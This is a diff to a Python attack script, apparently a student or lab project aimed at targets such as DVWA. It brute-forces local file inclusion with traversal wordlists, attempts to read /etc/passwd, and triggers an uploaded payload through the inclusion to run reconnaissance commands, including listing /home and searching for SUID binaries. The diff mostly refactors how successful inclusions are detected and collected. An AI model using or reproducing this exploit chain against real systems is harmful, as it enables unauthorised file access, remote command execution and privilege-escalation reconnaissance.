@@ -2,8 +2,8 @@
 
 import requests
 import urllib.parse
-import re
 
+TRAVERSAL_WORDLIST = "wordlists/traversal_small.txt"  # wordlists/traversal_small.txt OR wordlists/traversal_big.txt
 
 def show_passwd(target_url, COOKIE):
     print("Attempting to show /etc/passwd...")
@@ -28,6 +28,7 @@ def brute_force_lfi(
     payload_filenames,
     success_indicator,
     failure_indicator,
+    dir_wordlist,
     session,
     COOKIE,
 ):
@@ -35,13 +36,15 @@ def brute_force_lfi(
     print(f"Success indicator: {success_indicator}")
     print(f"Failure indicator: {failure_indicator}")
 
-    with open("upload_dir_wordlist.txt", "r") as f:
+    with open(dir_wordlist, "r") as f:
         payload_relatives = [
             line.strip() for line in f if not line.strip().startswith("#")
         ]
 
-    with open("traversal_small.txt", "r") as f:
+    with open(TRAVERSAL_WORDLIST, "r") as f:
         traversals = f.read().strip().split("\n")
+
+    successful_links = []
 
     for payload_relative in payload_relatives:
         for traversal in traversals:
@@ -49,32 +52,37 @@ def brute_force_lfi(
                 test_url = (
                     f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
                 )
-                # print(f"[*] Trying LFI URL: {test_url}")
+                print(f"[*] Trying LFI URL: {test_url}")
+
                 try:
                     response = session.get(test_url, cookies=COOKIE)
-                    # if "http://ict2214p1b2.mooo.com/" in lfi_url_base:
-                    #     if "File not found." not in response.text:
-                    #         print(f"[+] Successfully included payload: {test_url}")
-                    #         return test_url
-                    # elif "http://127.0.0.1/DVWA/" in lfi_url_base:
-                    #     if not response.text.startswith("<!DOCTYPE html>"):
-                    #         print(f"[+] Successfully included payload: {test_url}")
-                    #         return test_url
 
-                    if failure_indicator:
-                        if failure_indicator not in response.text:
-                            print(f"[+] Successfully included payload: {test_url}")
-                            return test_url
+                    is_success = False
 
-                    if success_indicator:
-                        if success_indicator in response.text:
-                            print(f"[+] Successfully included payload: {test_url}")
-                            return test_url
+                    # Failure indicator check
+                    if failure_indicator and failure_indicator in response.text:
+                        continue  # Skip this attempt
+
+                    # Success indicator check
+                    if success_indicator and success_indicator in response.text:
+                        is_success = True
+
+                    # If no success indicator, assume success when failure is absent
+                    if (
+                        not success_indicator
+                        and failure_indicator
+                        and failure_indicator not in response.text
+                    ):
+                        is_success = True
+
+                    if is_success:
+                        print(f"[+] Successfully included payload: {test_url}")
+                        successful_links.append(test_url)
 
                 except Exception as e:
                     print(f"[-] Error testing {test_url}: {str(e)}")
 
-    return None
+    return successful_links
 
 
 def trigger_payload_via_lfi(url, COOKIE):
@@ -89,7 +97,7 @@ def trigger_payload_via_lfi(url, COOKIE):
         "ls -lAh /home",
         "find /usr/bin /bin -perm -4000 2>/dev/null",
     ]
-    
+
     for command in commands:
         encoded_cmd = urllib.parse.quote(command)
         separator = "&" if "?" in url else "?"
@@ -99,12 +107,12 @@ def trigger_payload_via_lfi(url, COOKIE):
         try:
             response = requests.get(full_url, cookies=COOKIE)
             if response.status_code == 200:
-                print("[+] Command results:")
-                print(response.text)
+                # print("[+] Command results:")
+                # print(response.text)
                 return response.text
             else:
                 print(f"[-] Execution failed (HTTP {response.status_code})")
-                return ""
+                return None
         except Exception as e:
             print(f"[-] Trigger error: {str(e)}")
-            return ""
+            return None
